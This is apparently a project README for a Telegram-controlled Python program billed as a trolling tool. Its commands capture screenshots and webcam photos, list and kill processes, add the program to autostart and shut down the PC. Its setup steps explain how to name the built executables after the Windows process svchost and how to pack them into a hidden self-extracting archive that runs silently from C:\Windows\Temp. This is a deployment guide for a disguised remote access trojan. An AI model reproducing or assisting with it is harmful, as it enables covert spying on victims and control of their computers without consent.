# TrollTelegramPython
#### Python application for trolling and control.

This code accepts various commands from you through the Telegram bot and executes them.

### Content:
- Commands and their functions
- Setting up
- Convert scripts to exe format
- Creating installer
#
#
#### Commands and their functions

- Command: /check | Arguments: no required | Example: /check | Function: Send message about PC is online. | Settings: No.
- Command: /screen /screenshot | Arguments: no required | Example: /screen | Function: Creating screenshot and send her to you. | Settings: No.
- Command: /playsound /ps | Arguments: Audio file number (1-3) | Example: /playsound 2 | Function: Play sound on PC. | Settings: sound duration
- Command: /changewallpaper /chw | Arguments: Image file number (1-3) | Example: /changewallpaper 3 | Function: Change wallpaper on desktop. | Settings: No.
- Command: /volumemax | Arguments: no required | Example: /volumemax | Function: Volume upping to max. | Settings: No.
- Command: /volumemin | Arguments: no required | Example: /volumemin | Function: Volume downing to minimum. | Settings: No.
- Command: /camera /cam | Arguments: no required | Example: /camera | Function: Taking photo from camera and send to you. |  Settings: No.
- Command: /shutdown /off | Arguments: no required | Example: /shutdown | Function: Shutdown PC. | Settings: No.
- Command: /scream /fullscreen | Arguments: no required | Example: /scream | Function: Open image on fullscreen. | Settings: no.
- Command: /mouse /movemouse | Arguments: no required | Example: /mouse | Function: Move mouse in different directions. | Settings: No.
- Command: /proc /processes | Arguments: no required | Example: /proc | Function: Send you table with all processes on PC.
- Command: /kill | Arguments: number (process PID) | Example: /kill 1337 | Function: Kill process by PID. | Settings: No.
- Command: /autostart /as | Arguments: no required | Example: /as | Function: add program to PC autostart.
- Command: /spamdesktop /sd | Arguments: Files title, Files content, count files | Example: /sd test hello 5 | Function: Creating .txt files on desktop. | Settings: No.
- Command: /spammessage /smb | Arguments: Error title, Error content, count errors | Example: /smb test hello 10 | Function: Writing windows with errors. | Settings: No.

### Setting up
##### Telegram
Open your telegram and in search enter: @BotFather and create two bots following instructions.
##### Config
Open config.py file after select your language. And replace "yourtroll:tokenbot" on token from BotFather. Also replace "yourtroll:watchdogtoken" on token watchdogbot from BotFather.
Find your telegram UserID in telegram search @getmyid_bot and write her in USERID.
Next write name of audio files in MUSIC1, MUSIC2, MUSIC3 and select music duration in DELAYMUSIC.
Write path to images wallpapers for replace in WALLPAPER1, WALLPAPER2, WALLPAPER3.
Write name of image file for open on fullscreen in SCREAMIMAGENAME.
Select resolution of camera in CAMERAWIDTH and CAMERAHEIGHT.

### Convert scripts to exe format
First, install python on self PC.
Next open cmd and write:

```sh
pip --version
```
If haven't errors then look next step, if have errors, search solution in google.

Install 'auto py to exe'
```sh
pip install auto-py-to-exe
```
After install launch auto py to exe
```sh
auto-py-to-exe
```

auto-py-to-exe Instruction in images:

- https://imgur.com/a/jLvdDAI
- https://imgur.com/a/UtpYmFL
- https://imgur.com/a/XHdGTWc
- https://imgur.com/a/LegFQ7n
- https://imgur.com/a/rwg7Tw4

do this with main.py and watchdog.py
Name for watchdog.py - svchostI.exe
Name for main.py - svchostl.exe
### Creating installer
Install WinRar on self PC. and select all files and exe and after click RMB -> select 'Add to archive...'
Turn on Create SFX archive.
Open advanced -> SFX Options
Path to extract: C:\Windows\Temp
Open Setup and in Run after extraction write: svchostl.exe svchostI.exe
Open Modes and select Hide All
Click on OK and another one OK.